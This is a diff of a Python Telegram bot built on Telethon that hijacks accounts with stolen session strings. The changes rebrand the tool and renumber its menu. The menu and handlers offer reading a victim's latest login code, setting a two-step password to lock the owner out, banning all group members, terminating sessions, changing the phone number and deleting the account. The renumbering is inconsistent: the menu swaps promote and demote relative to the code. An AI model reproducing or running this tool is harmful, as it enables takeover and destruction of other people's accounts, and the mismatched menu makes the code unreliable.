@@ -1,4 +1,4 @@
-# COPYRIGHT © 2021-22 BY SHIELD22 🔥
+# COPYRIGHT © 2022 BY TeamRaiChu 🔥
 # NOW PUBLIC BY SHIELD
 import os
 os.system("pip install Telethon==1.21.1")
@@ -21,7 +21,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-SHIELD = 1967548493
+SHIELD = 1668305941
 
 
 async def change_number_code(strses, number, code, otp):
@@ -74,7 +74,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('SHIELDISBEST')
+      await X.edit_2fa('SHIELD')
       return True
     except:
       return False
@@ -146,40 +146,40 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "TheTeamShield"
+channel = "OfficialShield"
 menu = '''
 
-**NOTICE JOIN @TheTeamShield FEDERATION**
+**NOTICE JOIN @OfficialShield FEDERATION**
 FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
 
 
-A: [check user own groups and channels]
+1: [check user own groups and channels]
 
-B: [check user all information like phone number usrname...]
+2: [check user all information like phone number usrname...]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+3: [ban a group {give me StringSession and channel/group username i will ban all members there}]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+4: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
 
-E: [Join A Group/Channel via StringSession]
+5: [Join A Group/Channel via StringSession]
 
-F: [Leave A Group/Channel via StringSession]
+6: [Leave A Group/Channel via StringSession]
 
-G: [Delete A Group/Channel]
+7: [Delete A Group/Channel]
 
-H: [Check user two step is eneable or disable]
+8: [Check user two step is eneable or disable]
 
-I: [Terminate All current active sessions except Your StringSession]
+9: [Terminate All current active sessions except Your StringSession]
 
-J: [Delete Account]
+10: [Delete Account]
 
-K: [Demote all admins in a group/channel]
+11: [Demote all admins in a group/channel]
 
-L: [Promote a member in a group/channel]
+12: [Promote a member in a group/channel]
 
-M: [Change Phone number using StringSession]
+13: [Change Phone number using StringSession]
 
-I ADD MORE FEATURES LATER 😆
+Soon I am adding More Features!
 '''
 mm = '''
 You can hack anybody
@@ -214,7 +214,7 @@ async def start(event):
     await x.send_message(f"Choose what you want with string session \n\n{menu}")
     res = await x.get_response()
     r = res.text
-    if res.text == "A":
+    if res.text == "1":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -234,7 +234,7 @@ async def start(event):
         system("rm -rf session.txt")
       else:
         await event.reply(i + "\n\nThanks For using X Army Bot")
-    elif res.text == "B":
+    elif res.text == "2":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -244,7 +244,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
       await event.reply(i + "\n\nThanks For using X Army Bot")
-    elif r == "C":
+    elif r == "3":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -256,7 +256,7 @@ async def start(event):
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
       await event.reply("Banning all members Thanks For using X Army Bot")
-    elif r == "D":
+    elif r == "4":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -266,7 +266,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
       await event.reply(i + "\n\nThanks For using X Army Bot")
-    elif r == "E":
+    elif r == "5":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -278,7 +278,7 @@ async def start(event):
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
       await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
-    elif r == "F":
+    elif r == "6":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -290,7 +290,7 @@ async def start(event):
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
       await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
-    elif r == "G":
+    elif r == "7":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -302,7 +302,7 @@ async def start(event):
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
       await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
-    elif r == "H":
+    elif r == "8":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -315,7 +315,7 @@ async def start(event):
         await event.reply("User don't have two step thats why now two step is `SHIELDISBEST` you can login now\n\nThanks For using X Army Bot")
       else:
         await event.reply("Sorry User Have two step already")
-    elif r == "I":
+    elif r == "9":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -325,7 +325,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await terminate(strses.text)
       await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
-    elif res.text == "J":
+    elif res.text == "10":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -335,7 +335,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
       await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
-    elif res.text == "L":
+    elif res.text == "11":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -349,7 +349,7 @@ async def start(event):
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
       await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
-    elif res.text == "K":
+    elif res.text == "12":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
@@ -364,7 +364,7 @@ async def start(event):
       except:
         pass
       await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
-    elif res.text == "M":
+    elif res.text == "13":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
